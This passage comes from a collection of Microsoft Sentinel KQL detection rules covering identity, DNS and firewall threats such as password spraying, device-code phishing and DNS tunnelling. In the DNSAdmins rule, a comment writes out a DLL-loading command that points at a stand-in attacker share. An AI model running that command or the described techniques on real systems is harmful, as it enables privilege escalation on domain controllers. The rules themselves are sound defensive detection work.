    | extend AppName     = tostring(TargetResources[0].displayName)
    | where isnotempty(ActorUPN)
    | project ConsentTime=TimeGenerated, ActorUPN, AppId, AppName, OperationName;
AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(24h)
| where ResultType == 0
| join kind=inner RecentConsents
    on $left.UserPrincipalName == $right.ActorUPN, $left.AppId == $right.AppId
| where TimeGenerated > ConsentTime
   and  (TimeGenerated - ConsentTime) < 24h
| summarize
    NI_Count     = count(),
    IPs          = make_set(IPAddress),
    Countries    = make_set(Location),
    FirstUse     = min(TimeGenerated)
  by UserPrincipalName, AppName, AppId, ConsentTime, OperationName
| extend IPAddress = tostring(IPs[0])
| order by ConsentTime desc

// Title: 14-DNS-MX-Payload-Staging.yaml
// Source: https://www.kqlsearch.com/query/14-DNS-MX-Payload-Staging&cmqtuxhsw0048bljhtphrbusq
// Section: KQL
// Author: David Alonso
// Description:
// Detects MX record abuse for DNS payload staging. The Octoberfest7 technique
// encodes payloads as hex and stores them across many MX records, using the
// MX preference value (10, 20, 30...) to maintain ordering during reassembly.
// Key indicators:
// - High-volume MX queries from non-mail-server hosts
// - MX queries for the same domain with numeric subdomain prefixes (1.domain, 2.domain...)
// - Client is not a known mail relay or exchange server
// This technique was developed to evade MDE TXT-record detection by switching
// to MX records, which are not traditionally monitored for tunneling.
// Ref: Octoberfest7/DNS_Tunneling — "Off the beaten path" section

ASimDnsActivityLogs
| where TimeGenerated > ago(1h)
| where DnsQueryTypeName =~ "MX" or DnsQueryType == 15
| extend BaseDomain = strcat(
      tostring(split(DnsQuery, ".")[-2]), ".",
      tostring(split(DnsQuery, ".")[-1])
    )
| extend SubdomainPrefix = tostring(split(DnsQuery, ".")[0])
| extend HasNumericPrefix = SubdomainPrefix matches regex @"^\d+$"
| summarize
    MxQueryCount    = count(),
    NumericPrefixed = countif(HasNumericPrefix),
    UniquePrefixes  = dcount(SubdomainPrefix),
    SampleDomains   = make_set(DnsQuery, 15),
    FirstSeen       = min(TimeGenerated),
    LastSeen        = max(TimeGenerated)
  by SrcIpAddr, SrcHostname, BaseDomain
| where MxQueryCount > 10 and NumericPrefixed > 3

// Title: 14-NIAuth-BulkDataDownload.yaml
// Source: https://www.kqlsearch.com/query/14-NIAuth-BulkDataDownload&cmqtueuih001hbljh3sujehdg
// Section: KQL
// Author: David Alonso
// Description:
// Detects when a user silently refreshes an OAuth token and then performs bulk file
// downloads or access operations in SharePoint/OneDrive within the same period.
// This correlation identifies data exfiltration via applications that obtained persistent
// access through non-interactive authentication flows.
// MITRE ATT&CK: T1048 (Exfiltration Over Alternative Protocol), T1213 (Data from Information Repositories)

let SilentAuthUsers =
    AADNonInteractiveUserSignInLogs
    | invoke ExcludeAllowlistedIPs_AADNI()
    | where TimeGenerated > ago(2h)
    | where ResultType == 0
    | summarize SilentSignIns = count(), LastNI = max(TimeGenerated)
      by UserPrincipalName;
OfficeActivity
| where TimeGenerated > ago(2h)
| where Operation in (
    "FileDownloaded", "FileSyncDownloadedFull",
    "SearchQueryPerformed", "FileAccessed"
  )
// Suppress activity from trusted/allowlisted IPs. The download ClientIP must be
// checked too - filtering only the silent-auth IP still lets downloads from an
// allowlisted IP trigger the rule.
| extend IPAddress = ClientIP
| invoke ExcludeAllowlistedIPs_AADNI()
| summarize
    OpCount    = count(),
    FileCount  = dcount(SourceFileName),
    Operations = make_set(Operation),
    ClientIP   = tostring(make_set(ClientIP)[0])
  by UserId
| where OpCount > 150
| join kind=inner SilentAuthUsers on $left.UserId == $right.UserPrincipalName
| project
    UserPrincipalName = UserId,
    OperationCount    = OpCount,
    UniqueFiles       = FileCount,
    Operations,
    SilentSignIns,
    ClientIP
| order by OperationCount desc

// Title: 15-CSL-ThreatIntelligence-DomainMatch.yaml
// Source: https://www.kqlsearch.com/query/15-CSL-ThreatIntelligence-DomainMatch&cmqtulmzq002hbljhc22v21g6
// Section: KQL
// Author: David Alonso
// Description:
// Matches destination hostnames and URLs from firewall/proxy logs (Fortinet, Palo Alto, Zscaler)
// against active threat intelligence domain indicators in the ThreatIntelligenceIndicator table.
// A TI-flagged domain being resolved or accessed through the corporate perimeter — even if not
// blocked — indicates active C2 communication, phishing activity, or malware staging.
// MITRE ATT&CK: T1071 (Application Layer Protocol)

let TI_Domains =
    ThreatIntelligenceIndicator
    | where TimeGenerated > ago(30d)
    | where Active == true
    | where isnotempty(DomainName)
    | summarize
        TI_ThreatTypes = make_set(ThreatType),
        TI_Confidence  = max(ConfidenceScore)
      by DomainName;
CommonSecurityLog
| where TimeGenerated > ago(1d)
| where DeviceVendor in ("Fortinet", "Palo Alto Networks", "Zscaler")
| where isnotempty(DestinationHostName) or isnotempty(RequestURL)
| extend MatchKey = coalesce(DestinationHostName, RequestURL)
| join kind=inner TI_Domains on $left.MatchKey == $right.DomainName
| summarize
    FW_HitCount    = count(),
    FW_Users       = make_set(SourceUserName, 10),
    FW_SourceIPs   = make_set(SourceIP, 10),
    FW_Actions     = make_set(DeviceAction, 5),
    FW_Vendors     = make_set(DeviceVendor),
    TI_ThreatTypes = make_set(TI_ThreatTypes),
    TI_Confidence  = max(TI_Confidence),
    FirstSeen      = min(TimeGenerated),
    LastSeen       = max(TimeGenerated)
  by MatchKey
| order by FW_HitCount desc

// Title: 15-NIAuth-RiskyUsers.yaml
// Source: https://www.kqlsearch.com/query/15-NIAuth-RiskyUsers&cmqtuf0p3001ibljhex2w05mq
// Section: KQL
// Author: David Alonso
// Description:
// Detects users flagged as High or Medium risk by Azure AD Identity Protection
// who continue to silently authenticate via non-interactive token refreshes.
// When Identity Protection flags a user as at-risk or compromised but silent
// token activity continues, it means the attacker retained persistent access
// that bypasses the risk-based Conditional Access controls.
// MITRE ATT&CK: T1078 (Valid Accounts), T1528 (Steal Application Access Token)

let HighRiskUsers =
    AADRiskyUsers
    | where RiskState in ("atRisk", "confirmedCompromised")
    | where RiskLevel in ("high", "medium")
    | project UserPrincipalName, RiskLevel, RiskState, RiskDetail;
AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(1h)
| where ResultType == 0
| summarize
    SilentCount  = count(),
    Countries    = make_set(Location),
    IPs          = make_set(IPAddress),
    Apps         = make_set(AppDisplayName),
    LastActivity = max(TimeGenerated)
  by UserPrincipalName
| join kind=inner HighRiskUsers on UserPrincipalName
| where SilentCount >= 5
| extend IPAddress = tostring(IPs[0])
| project
    UserPrincipalName,
    RiskLevel,
    RiskState,
    RiskDetail,
    SilentCount,
    Countries,
    IPAddress,
    Apps,
    LastActivity
| order by SilentCount desc

// Title: 16-CSL-PaloAlto-ZonePolicyDenies.yaml
// Source: https://www.kqlsearch.com/query/16-CSL-PaloAlto-ZonePolicyDenies&cmqtulsrx002ibljhs42mpf3a
// Section: KQL
// Author: David Alonso
// Description:
// Detects high-volume Palo Alto Networks inter-zone policy deny events grouped by policy name
// and zone pair (>50 denies). A spike in denies against a specific policy may indicate a zone
// bypass attempt, misconfigured application, or an attacker testing firewall rules from a
// compromised internal host. Policy names and zone context help distinguish automated tooling
// from legitimate traffic.
// MITRE ATT&CK: T1562 (Impair Defenses), T1046 (Network Service Discovery)

CommonSecurityLog
| where TimeGenerated > ago(1d)
| where DeviceVendor == "Palo Alto Networks"
| where DeviceAction in ("deny", "drop", "reset-client", "reset-server", "reset-both",
                         "Reset-Both", "Drop", "Deny")
| where isnotempty(DeviceCustomString1) or isnotempty(DeviceCustomString2)
| summarize
    DenyCount        = count(),
    SourceIPs        = make_set(SourceIP, 20),
    DestinationIPs   = make_set(DestinationIP, 20),
    Ports            = make_set(DestinationPort, 10),
    Protocols        = make_set(Protocol, 5),
    PolicyNames      = make_set(DeviceCustomString1, 10),
    SourceZones      = make_set(DeviceCustomString2, 5),
    FirstSeen        = min(TimeGenerated),
    LastSeen         = max(TimeGenerated)
  by DeviceCustomString1, DeviceCustomString2, DeviceAction
| where DenyCount > 50
| order by DenyCount desc

// Title: 16-DNS-DNSAdmin-DLLInjection.yaml
// Source: https://www.kqlsearch.com/query/16-DNS-DNSAdmin-DLLInjection&cmqtuxw4c004abljhdgvscgos
// Section: KQL
// Author: David Alonso
// Description:
// Detects the DNSAdmins Active Directory privilege escalation technique where
// a member of the DNSAdmins group registers a malicious DLL to be loaded into
// dns.exe (which runs as SYSTEM) using:
// dnscmd.exe /config /serverlevelplugindll \\attacker\share\evil.dll
// The attack requires a subsequent DNS service restart to load the DLL, at
// which point the payload executes as NT AUTHORITY\SYSTEM on the DNS server
// (typically a Domain Controller).
// This technique was publicly documented by Shay Ber in 2017 and has been
// used in real-world attacks. Any account in DNSAdmins — even a low-privilege
// domain account — can execute this technique without Domain Admin rights.
// Key signals detected by this rule:
// 1. dnscmd.exe executed with /serverlevelplugindll in the command line
// 2. DNS service stop/restart within 60 minutes on the same host
// Both conditions must match on the same Computer within the time window.
// MITRE T1574.002 (Hijack Execution Flow: DLL Side-Loading via DNS service)
// MITRE T1078.002 (Domain Accounts — DNSAdmins group membership)
// Ref: Shay Ber "Abusing DNSAdmins privilege for escalation in Active Directory"

// Step 1: Detect dnscmd.exe invoked with /serverlevelplugindll
// (registers arbitrary DLL to be loaded by dns.exe at SYSTEM privilege)
let DnscmdAbuse =
    SecurityEvent
    | where TimeGenerated > ago(1h)
    | where EventID == 4688  // Process Creation (requires audit policy)
    | where NewProcessName has "dnscmd.exe"
    | where CommandLine has "serverlevelplugindll"
    | project
        DnscmdTime   = TimeGenerated,
        Computer,
        SubjectAccount = SubjectUserName,
        CommandLine;
// Step 2: Detect DNS service restart following the dnscmd call
// Restart is required to load the DLL — without it the attack is incomplete
let DnsServiceRestart =
    SecurityEvent
    | where TimeGenerated > ago(1h)
    | where EventID == 7036 or EventID == 4697
    | where Activity has "DNS" or ServiceName contains "DNS"
    | project
        RestartTime   = TimeGenerated,
        Computer,
        ServiceEvent  = Activity;
// Correlate: same Computer, restart within 60 min of dnscmd
DnscmdAbuse
| join kind=inner DnsServiceRestart on Computer
| where abs(datetime_diff("minute", DnscmdTime, RestartTime)) < 60
| project
    DnscmdTime,
    Computer,
    SubjectAccount,
    CommandLine,
    RestartTime,
    ServiceEvent

// Title: 16-PasswordSpray-NonInteractive.yaml
// Source: https://www.kqlsearch.com/query/16-PasswordSpray-NonInteractive&cmqtuf6t1001jbljhup4rdxdo
// Section: KQL
// Author: David Alonso
// Description:
// Detects horizontal password spray attacks via non-interactive sign-ins where a single
// source IP attempts authentication against many different user accounts using the same
// common password guesses. The attacker targets many accounts to stay below per-account
// lockout thresholds. Non-interactive spray is stealthy because it skips MFA prompts.
// MITRE ATT&CK: T1110.003 (Password Spraying)

let SprayErrors = dynamic(["50126", "50034", "50053"]);
AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(1h)
| extend ErrorCode = tostring(ResultType)
| where ErrorCode in (SprayErrors)
| summarize
    TargetCount = dcount(UserPrincipalName),
    Targets     = make_set(UserPrincipalName, 30),
    FailCount   = count(),
    ErrorCodes  = make_set(ErrorCode),
    UserAgents  = make_set(UserAgent),
    FirstSeen   = min(TimeGenerated),
    LastSeen    = max(TimeGenerated)
  by IPAddress, Location
| where TargetCount > 25
| order by TargetCount desc

// Title: 17-CSL-Fortinet-VPN-BruteForce.yaml
// Source: https://www.kqlsearch.com/query/17-CSL-Fortinet-VPN-BruteForce&cmqtulxox002jbljhtayrjdca
// Section: KQL
// Author: David Alonso
// Description:
// Detects repeated Fortinet SSL-VPN or administrative console authentication failures from a
// single source IP (>5 failures). VPN infrastructure is a primary target for credential
// stuffing and password spraying attacks since successful access provides direct network-level
// entry. High failure counts from a single IP are strong indicators of automated brute force
// or credential stuffing activity.
// MITRE ATT&CK: T1110 (Brute Force)

CommonSecurityLog
| where TimeGenerated > ago(1d)
| where DeviceVendor == "Fortinet"
| where DeviceEventClassID has_any ("32001", "32002", "39424", "39952")
    or Activity has_any ("ssl-vpn-tunnel", "vpn", "admin-login", "loginfailed",
                         "login failure", "authentication failed")
    or DeviceAction has_any ("failed", "denied", "reject", "failure")
| summarize
    FailureCount     = count(),
    UniqueUsers      = dcount(SourceUserName),
    UserList         = make_set(SourceUserName, 20),
    DestinationIPs   = make_set(DestinationIP, 5),
    SourcePorts      = make_set(SourcePort, 5),
    FirstSeen        = min(TimeGenerated),
    LastSeen         = max(TimeGenerated)
  by SourceIP, DeviceEventClassID
| where FailureCount > 5
| order by FailureCount desc

// Title: 17-ImpossibleTravel-MultipleCountries.yaml
// Source: https://www.kqlsearch.com/query/17-ImpossibleTravel-MultipleCountries&cmqtufcpt001kbljhztx1l2du
// Section: KQL
// Author: David Alonso
// Description:
// Detects users who successfully authenticate via non-interactive sign-ins from 4 or more
// distinct countries within a 1-hour window. While limited legitimate travel / VPN use can
// explain 2-3 countries, 4+ countries in 1 hour is physically impossible and strongly
// indicates refresh token theft being replayed from multiple attacker-controlled locations.
// MITRE ATT&CK: T1078 (Valid Accounts)

AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(1h)
| where ResultType == 0
| summarize
    Countries    = make_set(Location),
    CountryCount = dcount(Location),
    IPs          = make_set(IPAddress),
    Apps         = make_set(AppDisplayName),
    FirstSeen    = min(TimeGenerated),
    LastSeen     = max(TimeGenerated)
  by UserPrincipalName
| where CountryCount >= 4
| extend IPAddress = tostring(IPs[0])
| order by CountryCount desc

// Title: 17-SIGNIN-DeviceCodePhishing.yaml
// Source: https://www.kqlsearch.com/query/17-SIGNIN-DeviceCodePhishing&cmqtwfguv0009ie9neez4kixo
// Section: KQL
// Author: David Alonso
// Description:
// Detects successful device code flow authentications where one IP collects tokens for 2 or more accounts. Attackers phish victims to device.microsoft.com to enter a code the attacker generated — bypassing password and MFA. Actively used by Storm-0539 and Midnight Blizzard. MITRE ATT&CK: T1566 (Phishing), T1528 (Steal Application Access Token).

// ---- Network Allowlist (exclude trusted IPs / CIDR / ranges) --------------
  let _allow = materialize(union isfuzzy=true (print R="" | take 0), (_GetWatchlist('NetworkAllowlist') | project R = tostring(IPOrRange)) | where isnotempty(R));
  let _allowCIDR  = toscalar(_allow | where not(R matches regex @'^\d+\.\d+\.\d+\.\d+-\d+\.\d+\.\d+\.\d+$') | extend R = iff(R has '/', R, strcat(R, '/32')) | summarize make_list(R));
  let _allowRange = toscalar(_allow | where R matches regex @'^\d+\.\d+\.\d+\.\d+-\d+\.\d+\.\d+\.\d+$' | summarize make_list(R));
  let _ExcludeAllowlistedIPs = (T:(IPAddress:string)) {
      T
      | extend IPAddress = tostring(IPAddress)
      | where array_length(_allowCIDR) == 0 or isnull(ipv4_is_in_any_range(IPAddress, _allowCIDR)) or not(ipv4_is_in_any_range(IPAddress, _allowCIDR))
      | mv-apply _r = _allowRange to typeof(string) on (
          extend _lo = tostring(split(_r,'-')[0]), _hi = tostring(split(_r,'-')[1])
          | extend _inRange = ipv4_compare(IPAddress, _lo) >= 0 and ipv4_compare(IPAddress, _hi) <= 0
          | summarize _anyInRange = max(toint(_inRange)))
      | where isnull(_anyInRange) or _anyInRange == 0
      | project-away _anyInRange
  };
  // ---------------------------------------------------------------------------
  let lookback      = 4h;
  let multiUserMin  = 2;
  let highVolumeMin = 5;
  SigninLogs
  | invoke _ExcludeAllowlistedIPs()
  | where TimeGenerated > ago(lookback)
  | where AuthenticationProtocol == "deviceCode"
  | where ResultType == "0"
  | summarize
      SuccessCount  = count(),
      UniqueUsers   = dcount(UserPrincipalName),
      TargetedUsers = make_set(UserPrincipalName, 20),
      Locations     = make_set(Location, 5),
      Apps          = make_set(AppDisplayName, 5),
      FirstSeen     = min(TimeGenerated),
      LastSeen      = max(TimeGenerated)
    by IPAddress
  | where UniqueUsers >= multiUserMin or SuccessCount >= highVolumeMin
  | project
      TimeGenerated = FirstSeen,
      IPAddress, SuccessCount, UniqueUsers,
      TargetedUsers, Locations, Apps, LastSeen

// Title: 18-DNS-DoH-Bypass.yaml
// Source: https://www.kqlsearch.com/query/18-DNS-DoH-Bypass&cms50c3op0000p9ut0uhq1rbo
// Section: KQL
// Author: David Alonso
// Description:
// Detects internal clients performing the bootstrap A/AAAA lookup for a known
// public DNS-over-HTTPS (DoH) resolver (dns.google, cloudflare-dns.com,
// doh.opendns.com, dns.quad9.net, NextDNS, AdGuard, etc.). Once a client resolves
// the DoH endpoint it can tunnel all subsequent DNS over HTTPS/443, bypassing the
// corporate resolver, DNS filtering, and this very telemetry — a common evasion
// and C2 technique (malware and unsanctioned browsers/apps).
// Only the initial hostname resolution is visible in ASimDnsActivityLogs; that is
// the signal this rule keys on. Allowlist sanctioned DoH hosts/clients as needed.
// MITRE T1071.004 (DNS), T1572 (Protocol Tunneling), T1090 (Proxy)

let DohEndpoints = dynamic([
    "dns.google", "dns.google.com", "cloudflare-dns.com", "mozilla.cloudflare-dns.com",
    "chrome.cloudflare-dns.com", "one.one.one.one", "doh.opendns.com", "dns.quad9.net",
    "doh.cleanbrowsing.org", "dns.nextdns.io", "doh.dns.sb", "dns.adguard.com",
    "dns.adguard-dns.com", "doh.libredns.gr", "doh.mullvad.net", "dns.cloudflare.com"]);
ASimDnsActivityLogs
| where TimeGenerated > ago(1h)
| where DnsQueryTypeName in~ ("A", "AAAA")
| extend q = tolower(DnsQuery)
| where q in~ (DohEndpoints)
      or q has "cloudflare-dns.com" or q has "doh." or q has "dns.google"
      or q has "nextdns.io" or q has "dns.quad9"
| summarize
    DohLookups = count(),
    Providers  = make_set(DnsQuery, 15),
    FirstSeen  = min(TimeGenerated),
    LastSeen   = max(TimeGenerated)
  by SrcIpAddr, SrcHostname

// Title: 18-LegacyAuth-MFABypass.yaml
// Source: https://www.kqlsearch.com/query/18-LegacyAuth-MFABypass&cmqtufiob001lbljheiaxrw3k
// Section: KQL
// Author: David Alonso
// Description:
// Detects successful non-interactive sign-ins using legacy authentication protocols
// (Exchange ActiveSync, IMAP, POP3, SMTP, MAPI, etc.). These protocols cannot participate
// in MFA challenges or respond to Conditional Access policies, meaning any successful
// authentication completely bypasses your security controls. Attackers deliberately
// use legacy protocols to avoid MFA enforcement.
// MITRE ATT&CK: T1078 (Valid Accounts), T1190 (Exploit Public-Facing Application)

let LegacyProtocols = dynamic([
    "Exchange ActiveSync", "IMAP4", "MAPI Over HTTP",
    "POP3", "SMTP", "Authenticated SMTP", "AutoDiscover",
    "Exchange Online PowerShell", "Exchange Web Services",
    "Other clients", "Other clients; IMAP", "Other clients; POP"
]);
AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(1h)
| where ClientAppUsed in (LegacyProtocols)
| where ResultType == 0
| summarize
    SignInCount = count(),
    IPs         = make_set(IPAddress),
    Countries   = make_set(Location),
    Protocols   = make_set(ClientAppUsed),
    FirstSeen   = min(TimeGenerated),
    LastSeen    = max(TimeGenerated)
  by UserPrincipalName, AppDisplayName
| where SignInCount > 8
| extend IPAddress = tostring(IPs[0])
| order by SignInCount desc

// Title: 19-ADFS-MFAFatigue-FederationPivot.yaml
// Source: https://www.kqlsearch.com/query/19-ADFS-MFAFatigue-FederationPivot&cmqtu9kcu000sbljhbm18bf2e
// Section: KQL
// Author: David Alonso
// Description:
// Detects the "MFA fatigue → ADFS pivot" attack chain: a user receives 3 or more MFA push
// prompts (MFA fatigue indicators in SigninLogs), eventually approves one (MFA success), and
// then the attacker pivots to ADFS-federated resources within the same session window. This
// multi-stage attack exploits user MFA fatigue to gain initial access, then uses the resulting
// session to authenticate silently to on-premises resources via the ADFS federation path.
// MITRE ATT&CK: T1621 (Multi-Factor Authentication Request Generation), T1550 (Use Alternate Authentication Material)

let MFAFatigue =
    SigninLogs
    | where TimeGenerated > ago(1d)
    | where ResultType in (50074, 500121, 50076)
    | summarize
        MFAAttempts  = count(),
        FirstAttempt = min(TimeGenerated)
      by UserPrincipalName;
let MFASuccess =
    SigninLogs
    | where TimeGenerated > ago(1d)
    | where ResultType == 0
    | where AuthenticationRequirement == "multiFactorAuthentication"
    | summarize MFASuccessTime = min(TimeGenerated)
      by UserPrincipalName;
MFAFatigue
| where MFAAttempts >= 3
| join kind=inner MFASuccess on UserPrincipalName
| where MFASuccessTime > FirstAttempt
| join kind=inner (
    ADFSSignInLogs
    | where TimeGenerated > ago(1d)
    | where ResultType == 0
    | summarize
        ADFS_Count     = count(),
        ADFS_Countries = make_set(Location),
        ADFS_IPs       = make_set(IPAddress)
      by UserPrincipalName
  ) on UserPrincipalName
| where ADFS_Count > 5
| project
    UserPrincipalName,
    MFAAttempts,
    FirstMFAPrompt = FirstAttempt,
    MFASuccessTime,
    ADFS_Count,
    ADFS_Countries,
    ADFS_IPs
| order by MFAAttempts desc

// Title: 19-DNS-ThreatIntel-DomainMatch.yaml
// Source: https://www.kqlsearch.com/query/19-DNS-ThreatIntel-DomainMatch&cms50car20001p9utjhk6y9yv
// Section: KQL
// Author: David Alonso
// Description:
// Correlates DNS queries against active domain/hostname indicators in
// ThreatIntelIndicators (STIX 2.1). A client resolving a domain that is present
// in your threat-intel feed as a known-bad indicator is a high-confidence,
// low-false-positive signal of malware C2, phishing, or compromised
// infrastructure contact.
// Requires a Threat Intelligence data connector populating ThreatIntelIndicators
// (MDTI, TAXII, or custom). Only active, non-revoked domain/hostname indicators
// are matched. Complements the entropy/volume heuristics in this pack with a
// deterministic IOC match.
// MITRE T1071.004 (DNS Application Layer Protocol)

let TIDomains =
    ThreatIntelIndicators
    | where IsActive == true and Revoked == false
    | where ObservableKey in~ ("domain-name:value", "hostname:value")
    | where isnotempty(ObservableValue)
    | summarize by TIDomain = tolower(ObservableValue);
ASimDnsActivityLogs
| where TimeGenerated > ago(1h)
| where isnotempty(DnsQuery)
| extend q = tolower(DnsQuery)
| join kind=inner (TIDomains) on $left.q == $right.TIDomain
| summarize
    Requests  = count(),
    Clients   = make_set(SrcIpAddr, 20),
    Hostnames = make_set(SrcHostname, 20),
    FirstSeen = min(TimeGenerated),
    LastSeen  = max(TimeGenerated)
  by DnsQuery
| extend ThreatLevel = "🔴 Critical"

// Title: 19-HighFrequency-TokenRefresh.yaml
// Source: https://www.kqlsearch.com/query/19-HighFrequency-TokenRefresh&cmqtufoyw001mbljhmypakgvo
// Section: KQL
// Author: David Alonso
// Description:
// Detects users or IPs generating more than 150 successful non-interactive token refreshes
// within a single hour. Legitimate applications refresh tokens at reasonable intervals.
// Extremely high refresh rates indicate automated token replay (session hijack), malware
// maintaining persistent access, or a compromised automated pipeline.
// MITRE ATT&CK: T1528 (Steal Application Access Token), T1078

AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(1h)
| where ResultType == 0
| summarize
    RefreshCount = count(),
    Apps         = make_set(AppDisplayName),
    Countries    = make_set(Location)
  by UserPrincipalName, IPAddress
| where RefreshCount > 150
| order by RefreshCount desc

// Title: 20-ADFS-PIMActivation-FederationAbuse.yaml
// Source: https://www.kqlsearch.com/query/20-ADFS-PIMActivation-FederationAbuse&cmqtu9s4m000tbljhx2ooz5z5
// Section: KQL
// Author: David Alonso
// Description:
// Detects when a user activates a privileged role via Azure AD Privileged Identity Management
// (PIM) and then authenticates through the ADFS federation path within 30 minutes. This
// sequence indicates that an attacker has used a stolen credential or compromised account to
// activate elevated privileges via PIM, then immediately uses the ADFS federation trust to
// access on-premises or federated resources with those elevated privileges. This pattern
// combines cloud privilege escalation with on-premises lateral movement via the federation path.
// MITRE ATT&CK: T1078 (Valid Accounts), T1134 (Access Token Manipulation), T1098 (Account Manipulation)

let PIMActivations =
    AuditLogs
    | where TimeGenerated > ago(2h)
    | where OperationName has "Add member to role completed (PIM activation)"
    | extend UPN = tostring(InitiatedBy.user.userPrincipalName)
    | where isnotempty(UPN)
    | project
        ActivationTime = TimeGenerated,
        UPN,
        RoleName = tostring(TargetResources[0].displayName);
ADFSSignInLogs
| where TimeGenerated > ago(2h)
| where ResultType == 0
| join kind=inner PIMActivations on $left.UserPrincipalName == $right.UPN
| where TimeGenerated > ActivationTime
   and  (TimeGenerated - ActivationTime) < 30m
| project
    ADFSSignInTime     = TimeGenerated,
    ActivationTime,
    UserPrincipalName,
    RoleName,
    AppDisplayName,
    IPAddress,
    Location,
    AuthenticationRequirement,
    TimeSincePIM       = (TimeGenerated - ActivationTime)
| order by ADFSSignInTime desc

// Title: 20-DNS-DynamicDNS-Provider-Abuse.yaml
// Source: https://www.kqlsearch.com/query/20-DNS-DynamicDNS-Provider-Abuse&cms50cetl0002p9utm0geprm6
// Section: KQL
// Author: David Alonso
// Description:
// Detects internal clients resolving domains hosted on free dynamic-DNS and
// ephemeral-tunnel providers (DuckDNS, No-IP, FreeDNS/afraid.org, ngrok,
// trycloudflare, localtunnel, etc.). These services are heavily abused for
// malware C2, phishing, and data exfiltration because they give attackers a
// free, quickly-rotatable hostname without domain registration.
// Legitimate corporate use is rare; where it exists (e.g. a sanctioned ngrok
// tunnel) allowlist the specific base domain or source host.
// MITRE T1071.004 (DNS), T1568 (Dynamic Resolution)

let DynDnsProviders = dynamic([
    "duckdns.org", "no-ip.org", "no-ip.com", "noip.com", "hopto.org", "zapto.org",
    "ddns.net", "myftp.biz", "myftp.org", "serveftp.com", "servegame.com", "sytes.net",
    "ngrok.io", "ngrok-free.app", "ngrok.app", "trycloudflare.com", "loca.lt",
    "portmap.io", "dnsalias.com", "dyndns.org", "afraid.org", "chickenkiller.com",
    "mooo.com", "us.to", "3utilities.com", "bounceme.net", "redirectme.net"]);
ASimDnsActivityLogs
| where TimeGenerated > ago(1h)
| extend BaseDomain = strcat(tostring(split(DnsQuery, ".")[-2]), ".", tostring(split(DnsQuery, ".")[-1]))
| where BaseDomain in~ (DynDnsProviders) or DnsQuery has_any (DynDnsProviders)
| summarize
    Requests      = count(),
    UniqueDomains = dcount(DnsQuery),
    Providers     = make_set(BaseDomain, 10),
    SampleDomains = make_set(DnsQuery, 15),
    FirstSeen     = min(TimeGenerated),
    LastSeen      = max(TimeGenerated)
  by SrcIpAddr, SrcHostname
| where Requests > 5

// Title: 21-DNS-Suspicious-TLD-Volume.yaml
// Source: https://www.kqlsearch.com/query/21-DNS-Suspicious-TLD-Volume&cms50cjsu0003p9utmxg1d8pq
// Section: KQL
// Author: David Alonso
// Description:
// Detects a client resolving many distinct domains under top-level domains
// with a disproportionately high abuse rate (e.g. .zip, .mov, .top, .xyz, .cfd,
// .sbs, .lol, .quest, and free ccTLDs .tk/.ml/.ga/.cf/.gq). While each of these
// TLDs has some legitimate use, a single host resolving 10+ unique domains under
// them in an hour is a strong signal of DGA, malware C2 rotation, or phishing
// redirect chains. Tune the SuspiciousTlds list and threshold to your baseline.
// MITRE T1071.004 (DNS), T1568.002 (Domain Generation Algorithms)

let SuspiciousTlds = dynamic([
    "zip", "mov", "xyz", "top", "gq", "tk", "ml", "cf", "ga", "work", "click",
    "country", "kim", "science", "party", "review", "loan", "download", "stream",
    "racing", "fit", "cam", "rest", "mom", "cfd", "sbs", "lol", "quest", "cyou", "buzz"]);
ASimDnsActivityLogs
| where TimeGenerated > ago(1h)
| extend Tld = tostring(split(tolower(DnsQuery), ".")[-1])
| where Tld in (SuspiciousTlds)
| summarize
    Requests      = count(),
    UniqueDomains = dcount(DnsQuery),
    Tlds          = make_set(Tld, 15),
    SampleDomains = make_set(DnsQuery, 15),
    FirstSeen     = min(TimeGenerated),
    LastSeen      = max(TimeGenerated)
  by SrcIpAddr, SrcHostname
| where UniqueDomains > 10

// Title: 21-ServicePrincipal-AnomalousIPSpread.yaml
// Source: https://www.kqlsearch.com/query/21-ServicePrincipal-AnomalousIPSpread&cmqtug1bf001obljhhatu74g6
// Section: KQL
// Author: David Alonso
// Description:
// Detects service principals (workload identities) successfully authenticating from
// 9 or more distinct IP addresses in a 24-hour period. Legitimate service principals
// typically authenticate from a stable set of IPs (application servers, pipelines).
// Wide IP spread indicates compromised service principal credentials being used
// from multiple attacker machines or distributed attack infrastructure.
// MITRE ATT&CK: T1078.004 (Cloud Accounts), T1528

AADServicePrincipalSignInLogs
| invoke ExcludeAllowlistedIPs_AADNI()
| where TimeGenerated > ago(24h)
| where ResultType == 0
| summarize
    SignInCount = count(),
    UniqueIPs   = dcount(IPAddress),
    IPs         = make_set(IPAddress),
    Countries   = make_set(Location),
    FirstSeen   = min(TimeGenerated)
  by ServicePrincipalName, ServicePrincipalId, AppId
| where UniqueIPs > 8
| extend IPAddress = tostring(IPs[0])
| order by UniqueIPs desc

// Title: 23-BruteForce-SingleUserTargeted.yaml
// Source: https://www.kqlsearch.com/query/23-BruteForce-SingleUserTargeted&cmqtugb9y001qbljhfq7jb1r9
// Section: KQL
// Author: David Alonso
// Description:
// Detects targeted brute force / credential stuffing attacks against a single user account
// via non-interactive sign-ins, where the attacker uses multiple IP addresses to avoid
// rate limiting. The attack manifests as many authentication failures with wrong-password
// or locked-account error codes across distributed source IPs targeting the same user.
// MITRE ATT&CK: T1110 (Brute Force), T1110.001 (Password Guessing), T1110.004 (Credential Stuffing)

let BruteForceErrors = dynamic([
    "50126",  // InvalidPasswordOrUsernameOrTenantInvalid
    "50055",  // InvalidPasswordExpiredPassword
    "50056",  // InvalidPasswordNullPassword
    "50064",  // CredentialAuthenticationError
    "50053",  // IdsLocked (account locked)
    "50034",  // UserAccountNotFound
    "50057",  // UserDisabled
    "50128"   // InvalidTenantName
]);
AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(1h)
| extend ErrorCode = tostring(ResultType)
| where ErrorCode in (BruteForceErrors)
| summarize
    FailCount   = count(),
    UniqueIPs   = dcount(IPAddress),
    IPs         = make_set(IPAddress, 20),
    Countries   = make_set(Location),
    ErrorCodes  = make_set(ErrorCode),
    FirstSeen   = min(TimeGenerated),
    LastSeen    = max(TimeGenerated)
  by UserPrincipalName
| where FailCount > 50
| extend IPAddress = tostring(IPs[0])
| order by FailCount desc

// Title: 24-ROPC-CredentialStuffing.yaml
